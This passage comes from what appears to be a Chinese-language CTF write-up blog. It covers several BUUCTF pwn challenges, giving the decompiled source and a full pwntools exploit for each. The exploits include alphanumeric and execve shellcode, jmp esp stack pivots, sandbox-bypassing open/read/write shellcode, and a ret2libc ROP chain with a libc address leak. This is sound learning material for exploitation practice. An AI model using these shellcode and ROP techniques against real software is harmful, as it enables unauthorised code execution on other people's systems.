<p>​	上面这些的意思大概就是我们输入的<code>shellcode</code>必须是可见字符，才能执行<code>call rax</code>即<code>shellcode</code>。<code>Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t</code>这是一个可见字符的<code>shellcode</code>，我们直接发送即可。</p>
<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a><code>exp</code></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&#x27;./revenge&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">27872</span>)</span><br><span class="line"><span class="comment">#debug(p)</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">b&#x27;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&#x27;</span></span><br><span class="line">p.send(shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>拿到<code>flag</code></p>
<p><img src="https://gitee.com/Qwen11/pic/raw/master/202403041026443.png" alt="image-20240225155343411"></p>
<h2 id="x-ctf-b0verfl0w-sub-esp-0x28-jmp-esp"><a href="#x-ctf-b0verfl0w-sub-esp-0x28-jmp-esp" class="headerlink" title="x_ctf_b0verfl0w(sub esp,0x28;jmp esp)"></a><code>x_ctf_b0verfl0w(sub esp,0x28;jmp esp)</code></h2><p>​	查看保护没有开<code>NX</code>，我们首先想到<code>shellcode</code>，程序中主要的源码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> vul();</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">vul</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">32</span>]; <span class="comment">// [esp+18h] [ebp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\n======================&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nWelcome to X-CTF 2016!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\n======================&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What&#x27;s your name?&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  fgets(s, <span class="number">50</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello %s.&quot;</span>, s);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	<code>fgets</code>这里我们能输入<code>50</code>个字节，可以溢出<code>14</code>个字节，这<code>14</code>个字节的长度肯定不够我们的<code>shellcode</code>的长度，也就是说我们不能直接栈溢出覆盖返回地址为<code>shellcode</code>的起始地址。</p>
<p><img src="https://gitee.com/Qwen11/pic/raw/master/202403041026635.png" alt="image-20240226124145542"></p>
<p>​	不过我们在程序中找到了<code>jmp esp</code>这个指令，结合着<code>sub esp,0x28;jmp esp</code>这个指令，就可以在栈中构造一个这样的结构。执行完<code>ret</code>后，<code>esp</code>会再<code>+4</code>，此时距离<code>shellcode</code>正好<code>40</code>个字节，然后<code>sub   esp,0x28</code>后<code>esp</code>便会指向<code>shellcode</code>，然后<code>jmp   esp</code>后执行流便会跳到<code>esp</code>指向的位置执行，也就是执行我们的<code>shellcode</code>。</p>
<p><img src="/../../../AppData/Roaming/Typora/typora-user-images/image-20240226125433840.png" alt="image-20240226125433840"></p>
<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a><code>exp</code></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&#x27;./b&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">28725</span>)</span><br><span class="line"><span class="comment">#debug(p)</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor ecx,ecx</span></span><br><span class="line"><span class="string">xor edx,edx</span></span><br><span class="line"><span class="string">xor ebx,ebx</span></span><br><span class="line"><span class="string">push ebx</span></span><br><span class="line"><span class="string">push 0x68732f2f</span></span><br><span class="line"><span class="string">push 0x6e69622f</span></span><br><span class="line"><span class="string">mov ebx,esp</span></span><br><span class="line"><span class="string">push 11</span></span><br><span class="line"><span class="string">pop eax</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)  <span class="comment">#24</span></span><br><span class="line">payload = shellcode+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>-<span class="number">24</span>+<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">jmp_esp = <span class="number">0x08048504</span></span><br><span class="line">sub_esp_jmp=asm(<span class="string">&#x27;&#x27;&#x27;sub esp,0x28;jmp esp&#x27;&#x27;&#x27;</span>)</span><br><span class="line">payload += p32(jmp_esp)+sub_esp_jmp</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>拿到<code>flag</code></p>
<p><img src="https://gitee.com/Qwen11/pic/raw/master/202403041026829.png" alt="image-20240225223830486"></p>
<h2 id="极客大挑战-2019-Not-Bad-orw-mmap"><a href="#极客大挑战-2019-Not-Bad-orw-mmap" class="headerlink" title="[极客大挑战 2019]Not Bad(orw,mmap)"></a><code>[极客大挑战 2019]Not Bad(orw,mmap)</code></h2><p>保护：</p>
<p><img src="https://gitee.com/Qwen11/pic/raw/master/202403041026813.png" alt="image-20240302141924012"></p>
<p>源码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  mmap((<span class="type">void</span> *)<span class="number">0x123000</span>, <span class="number">0x1000</span>uLL, <span class="number">6</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  sub_400949();</span><br><span class="line">  sub_400906();</span><br><span class="line">  sub_400A16();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">sub_400A16</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Easy shellcode, have fun!&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x38</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Baddd! Focu5 me! Baddd! Baddd!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>​	没有开<code>NX</code>保护，大概率要用<code>shellcode</code>，但是本题开了沙箱，我们只能以<code>open,read,write</code>这样的方式获取<code>flag</code>了。有栈溢出，只能溢出<code>0x10</code>个字节，而<code>buf</code>本身也只有<code>0x20</code>个字节，二者都达不到我们写的<code>shellcode</code>的长度，我们只能想其他办法。</p>
<p>​	<code>mmap()</code>函数用于将一个文件或者设备映射到内存中，从而允许对其进行直接的读写操作。本题中<code>mmap</code>为我们分配了一块可读可写的内存，起始地址为<code>0x123000</code>长度为<code>0x1000</code>一个内存页。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//函数原型</span></span><br><span class="line"><span class="type">void</span> *<span class="title function_">mmap</span><span class="params">(<span class="type">void</span> *addr, <span class="type">size_t</span> length, <span class="type">int</span> prot, <span class="type">int</span> flags, <span class="type">int</span> fd, <span class="type">off_t</span> offset)</span>;</span><br></pre></td></tr></table></figure>

<p>​	也就是说我们可以把<code>shellcode</code>布置到<code>mmap</code>为我们分配的地址上，然后再调用<code>shellcode</code>所在的地址即<code>0x123000</code>即可。这一步的<code>payload</code>如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">mmap = <span class="number">0x123000</span></span><br><span class="line">call_0x123000 = asm(<span class="string">&#x27;&#x27;&#x27;mov rax,0x123000;call rax&#x27;&#x27;&#x27;</span>)</span><br><span class="line">payload = asm(shellcraft.read(<span class="number">0</span>,mmap,<span class="number">0x100</span>))+call_0x123000</span><br></pre></td></tr></table></figure>

<p>​	我来解释一下上面的内容：<code>shellcraft.read(0,mmap,0x100)</code>的意思是从标准输入中读入数据写到<code>mmap</code>为我们分配的地址上，然后用<code>mov rax,0x123000;call rax</code>这两个指令，调用即可。</p>
<p>​	但是我们只能溢出<code>16</code>个字节，上面这些肯定超出了<code>16</code>个字节，所以我们可以把这些布置到<code>buf</code>中，然后再栈迁移到<code>buf</code>的起始地址即可，完整的<code>payload</code>如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">mmap = <span class="number">0x123000</span></span><br><span class="line">jmp_rsp = <span class="number">0x400A01</span></span><br><span class="line">sub_rsp_jmp = asm(<span class="string">&#x27;&#x27;&#x27;sub rsp,0x30;jmp rsp&#x27;&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#buf+ebp+返回地址(jmp rsp) 一共0x30个字节,也就是控制程序执行流到buf的起始地址开始执行</span></span><br><span class="line">call_0x123000 = asm(<span class="string">&#x27;&#x27;&#x27;mov rax,0x123000;call rax&#x27;&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#0x123000这个地址放的有shellcode，这里的意思就是执行shellcode</span></span><br><span class="line"></span><br><span class="line">payload = (asm(shellcraft.read(<span class="number">0</span>,mmap,<span class="number">0x100</span>))+call_0x123000).ljust(<span class="number">0x28</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(jmp_rsp)+sub_rsp_jmp</span><br></pre></td></tr></table></figure>

<p>​	然后我们利用<code>shellcraft</code>生成<code>open,read,write</code>的<code>shellcode</code>。<code>shellcraft</code>是<code>pwntools</code>库的一部分，是一个用于生成各种<code>shellcode</code>的模块。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#open(&#x27;./flag&#x27;)  打开根目录下的flag文件</span></span><br><span class="line"><span class="comment">#read(3,addr,0x50)  3是上面打开的新文件的文件描述符</span></span><br><span class="line"><span class="comment">#write(1,addr,0x50)</span></span><br><span class="line"></span><br><span class="line">mmap = <span class="number">0x123000</span></span><br><span class="line">orw_shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>)        </span><br><span class="line">orw_shellcode += shellcraft.read(<span class="number">3</span>,mmap,<span class="number">0x50</span>)      <span class="comment">#这里我们把读出来的内容放到mmap分配给我们的内存地址上</span></span><br><span class="line">orw_shellcode += shellcraft.write(<span class="number">1</span>,mmap,<span class="number">0x50</span>)     </span><br></pre></td></tr></table></figure>

<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&#x27;./bad&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">28453</span>)</span><br><span class="line"><span class="comment">#debug(p)</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">mmap = <span class="number">0x123000</span></span><br><span class="line">jmp_rsp = <span class="number">0x400A01</span></span><br><span class="line">sub_rsp_jmp = asm(<span class="string">&#x27;&#x27;&#x27;sub rsp,0x30;jmp rsp&#x27;&#x27;&#x27;</span>)</span><br><span class="line">call_0x123000 = asm(<span class="string">&#x27;&#x27;&#x27;mov rax,0x123000;call rax&#x27;&#x27;&#x27;</span>)</span><br><span class="line">payload = (asm(shellcraft.read(<span class="number">0</span>,mmap,<span class="number">0x100</span>))+call_0x123000).ljust(<span class="number">0x28</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(jmp_rsp)+sub_rsp_jmp</span><br><span class="line">p.recvline()</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">orw_shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>)        </span><br><span class="line">orw_shellcode += shellcraft.read(<span class="number">3</span>,mmap,<span class="number">0x50</span>)     </span><br><span class="line">orw_shellcode += shellcraft.write(<span class="number">1</span>,mmap,<span class="number">0x50</span>) </span><br><span class="line">shellcode = asm(orw_shellcode)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>拿到<code>flag</code></p>
<p><img src="https://gitee.com/Qwen11/pic/raw/master/202403041025976.png" alt="image-20240302212556600"></p>
<h2 id="picoctf-2018-leak-me"><a href="#picoctf-2018-leak-me" class="headerlink" title="picoctf_2018_leak_me"></a><code>picoctf_2018_leak_me</code></h2><p>保护：<br><img src="https://gitee.com/Qwen11/pic/raw/master/202403041025360.png" alt="image-20240226134815274"></p>
<p>源码：</p>
<p><img src="https://gitee.com/Qwen11/pic/raw/master/202403041025754.png" alt="image-20240226135031165"></p>
<p><img src="https://gitee.com/Qwen11/pic/raw/master/202403041025263.png" alt="image-20240226135056716"></p>
<p>​	程序中有两次输入，没有溢出，第一次输入到<code>v5</code>后程序会从<code>password.txt</code>文件中读取<code>password</code>到<code>s</code>中，然后第二次输入到<code>s1</code>，检查<code>s</code>与<code>s1</code>是否一样，一样则执行<code>flag</code>函数，反之则结束。<code>flag</code>函数中会从<code>flag.txt</code>文件读取<code>flag</code>并输出。</p>
<p>​	程序中在读取<code>password</code>到<code>s</code>后，有一个<code>puts(v5)</code>，我在想可不可能打印<code>v5</code>的时候把<code>s</code>带出，然后查看<code>v5,s</code>他们的位置如下：</p>
<p><img src="https://gitee.com/Qwen11/pic/raw/master/202403041025524.png" alt="image-20240226135854866"></p>
<p><img src="https://gitee.com/Qwen11/pic/raw/master/202403041025014.png" alt="image-20240226135912038"></p>
<p><img src="https://gitee.com/Qwen11/pic/raw/master/202403041025731.png" alt="image-20240226135928750"></p>
<p>​	我们可以看到<code>v5</code>的后<code>0x54</code>个字节与<code>s</code>完全重合，也就是说如果我们在第一次输入的时候把<code>v5</code>填满，然后程序从<code>password.txt</code>中读取<code>password</code>写到<code>s</code>即<code>v5</code>的后<code>0x54</code>个字节中，然后<code>puts(v5)</code>的时候因为中间没有<code>00</code>，所以<code>s</code>也会被带出。知道<code>password</code>后，一切就好办了。</p>
<h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a><code>exp</code></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&#x27;./pico&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">27247</span>)</span><br><span class="line"><span class="comment">#debug(p)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">256</span>-<span class="number">0x14</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>拿到<code>flag</code></p>
<p><img src="/../../../AppData/Roaming/Typora/typora-user-images/image-20240226141140541.png" alt="image-20240226141140541"></p>
<h2 id="护网杯-2018-gettingstart"><a href="#护网杯-2018-gettingstart" class="headerlink" title="护网杯_2018_gettingstart"></a>护网杯_2018_gettingstart</h2><p>保护：</p>
<p><img src="https://gitee.com/Qwen11/pic/raw/master/202403041025339.png" alt="image-20240226162300343"></p>
<p>源码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 buf[<span class="number">3</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  <span class="type">double</span> v6; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  v5 = <span class="number">0x7FFFFFFFFFFFFFFF</span>LL;</span><br><span class="line">  v6 = <span class="number">1.797693134862316e308</span>;</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;HuWangBei CTF 2018 will be getting start after %lu seconds...\n&quot;</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;But Whether it starts depends on you.&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x28</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( v5 == <span class="number">0x7FFFFFFFFFFFFFFF</span>LL &amp;&amp; v6 == <span class="number">0.1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;HuWangBei CTF 2018 will be getting start after %g seconds...\n&quot;</span>, v6);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try again!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	执行<code>system(&quot;/bin/sh&quot;)</code>的条件是<code>v5 == 0x7FFFFFFFFFFFFFFFLL &amp;&amp; v6 == 0.1</code>，我们直接在<code>v5,v6</code>的地址写上相应的数即可。</p>
<p><img src="https://gitee.com/Qwen11/pic/raw/master/202403041025834.png" alt="image-20240226162734086"></p>
<p>​	<code>0.1</code>在内存中的存储形式是**<code>0x3FB999999999999A</code>**，<a target="_blank" rel="noopener" href="http://www.binaryconvert.com/convert_double.html?decimal=048046049">这个网站</a>可以查看。</p>
<p><img src="https://gitee.com/Qwen11/pic/raw/master/202403041025165.png" alt="image-20240226163447805"></p>
<h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a><code>exp</code></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&#x27;./2018&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">25362</span>)</span><br><span class="line"><span class="comment">#debug(p)</span></span><br><span class="line"></span><br><span class="line">v5 = <span class="number">0x7FFFFFFFFFFFFFFF</span></span><br><span class="line">v6 = <span class="number">0x3FB999999999999A</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x30</span>-<span class="number">0x18</span>)+p64(v5)+p64(v6)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>拿到<code>flag</code></p>
<p><img src="https://gitee.com/Qwen11/pic/raw/master/202403041025806.png" alt="image-20240226163559219"></p>
<h2 id="picoctf-2018-buffer-overflow-0-signal"><a href="#picoctf-2018-buffer-overflow-0-signal" class="headerlink" title="picoctf_2018_buffer overflow 0(signal)"></a><code>picoctf_2018_buffer overflow 0(signal)</code></h2><p>保护：</p>
<p><img src="https://gitee.com/Qwen11/pic/raw/master/202403041025509.png" alt="image-20240228195142567"></p>
<p>​	本题提示了要<code>ssh</code>，我的<code>ubuntu</code>上没有这个，先安装</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install openssh-server</span><br><span class="line">sudo systemctl status ssh   <span class="comment">#检测ssh服务是否在运行</span></span><br></pre></td></tr></table></figure>

<p>然后<code>ssh -p 26609 CTFMan@node5.buuoj.cn</code>连接，直接输入密码即可</p>
<p><img src="https://gitee.com/Qwen11/pic/raw/master/202403041025768.png" alt="image-20240228144048463"></p>
<p>​	查看源码，我们可以看到<code>flag</code>中是从<code>flag.txt</code>读取的内容，大概就是我们要的<code>flag</code></p>
<p><img src="https://gitee.com/Qwen11/pic/raw/master/202403041025042.png" alt="image-20240228144554886"></p>
<blockquote>
<p><em>在 C 语言中，<code>signal</code> 函数用于建立一个信号处理函数，即一个在特定信号发生时将被调用的函数。</em></p>
<p><em>信号编号 <code>11</code> 通常对应于 <code>SIGSEGV</code> 信号，表示段错误（<code>Segmentation Fault</code>），即进程访问了无效的内存地址。</em></p>
</blockquote>
<p>​	<code>signal(11, sigsegv_handler);</code>的意思是当接收到时<code>linux</code>中信号编号为<code>11</code>的信号，会触发下面这个函数（<code>sigsegv_handler</code>）来处理信号，<code>SIGSEGV</code>信号通常表示内存访问错误，当程序尝试访问未分配的内存或越界访问内存时会导致段错误。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl __noreturn <span class="title function_">sigsegv_handler</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%s\n&quot;</span>, flag);   <span class="comment">//flag中的数据被写到标准错误流中</span></span><br><span class="line">  fflush(<span class="built_in">stderr</span>);  <span class="comment">//刷新标准错误流确保flag输出</span></span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);  <span class="comment">//退出</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	<code>vuln((char *)argv[1])</code>函数中的内容如下，其参数<code>argv[1]</code>是我们运行这个程序后面跟的第一个参数（<code>./vuln</code>是<code>argv[0]</code>）。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *__cdecl <span class="title function_">vuln</span><span class="params">(<span class="type">char</span> *src)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> dest[<span class="number">24</span>]; <span class="comment">// [esp+0h] [ebp-18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strcpy</span>(dest, src); <span class="comment">//这里可以溢出，发生段错误</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输入超过<code>24 + 4</code>个字节，即可得到<code>flag</code></p>
<p><img src="https://gitee.com/Qwen11/pic/raw/master/202403041024181.png" alt="image-20240228191748730"></p>
<h1 id="二"><a href="#二" class="headerlink" title="二"></a>二</h1><h2 id="HarekazeCTF2019-baby-rop2"><a href="#HarekazeCTF2019-baby-rop2" class="headerlink" title="[HarekazeCTF2019]baby_rop2"></a><code>[HarekazeCTF2019]baby_rop2</code></h2><img src="https://gitee.com/Qwen11/pic/raw/master/202403041028088.png" alt="image-20240118201810930" style="zoom:80%;" />

<p>​	这道题依旧<code>ret2libc</code>，通过<code>printf</code>函数，泄漏<code>read</code>函数的<code>libc</code>地址，求出<code>libc</code>基地址。<code>read</code>函数栈溢出，构造<code>printf</code>函数的<code>rop</code>链。</p>
<p><code>printf</code>函数原型如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">printf</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *format, ...)</span>;</span><br></pre></td></tr></table></figure>

<p>​	<code>	printf</code>函数是格式化输出，本题中需要在<code>printf</code>的第一个参数中放入含有<code>%s</code>的内容，第二个参数便是我们要输出的内容，即<code>read</code>函数的<code>libc</code>地址，即<code>read</code>的<code>got</code>地址。</p>
<p><code>exp</code>如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">28416</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./babyrop2&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./babyrop2&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">printf_plt = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">rdi_addr = <span class="number">0x400733</span></span><br><span class="line">argu1_addr = <span class="number">0x400770</span></span><br><span class="line">rsi_r15_addr = <span class="number">0x400731</span></span><br><span class="line">main_addr = <span class="number">0x400636</span></span><br><span class="line"><span class="comment">#main_addr = elf.sym[&#x27;main&#x27;]</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span></span><br><span class="line">payload += p64(rdi_addr)+p64(argu1_addr)</span><br><span class="line">payload += p64(rsi_r15_addr)+p64(read_got)+p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(printf_plt)+p64(main_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;name?&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">read_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment">#print(hex(read_addr))</span></span><br><span class="line">base_addr = read_addr-libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">system_addr = base_addr+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = base_addr+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span></span><br><span class="line">payload += p64(rdi_addr)+p64(bin_sh_addr)+p64(system_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;!&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;What&#x27;s your name?&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>​	这道题我只能打通远程，本地无论如何也打不通。并且打通远程后，一定要快速找到<code>flag</code>，因为很快他就会自行结束交互。</p>
<p><img src="https://gitee.com/Qwen11/pic/raw/master/202403041029461.png" alt="image-20240118202922954"></p>
<h2 id="picoctf-2018-buffer-overflow-2"><a href="#picoctf-2018-buffer-overflow-2" class="headerlink" title="picoctf_2018_buffer overflow 2"></a><code>picoctf_2018_buffer overflow 2</code></h2><p>​	栈溢出，直接覆盖返回地址为<code>win</code>函数地址，并给<code>win</code>函数传参使得<code>a1 = 0x0xDEADBEEF,a2 = 0xDEADC0DE</code>，拿到<code>shell</code>。</p>
<p><code>exp</code>如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from tools import *</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./pico&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">29662</span>)</span><br><span class="line">debug(p)</span><br><span class="line"></span><br><span class="line">win_addr = <span class="number">0x080485cb</span></span><br><span class="line">a1 = <span class="number">0xDEADBEEF</span></span><br><span class="line">a2 = <span class="number">0xDEADC0DE</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">4</span>)+p32(win_addr)+p32(<span class="number">0</span>)+p32(a1)+p32(a2)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>拿到<code>flag</code></p>
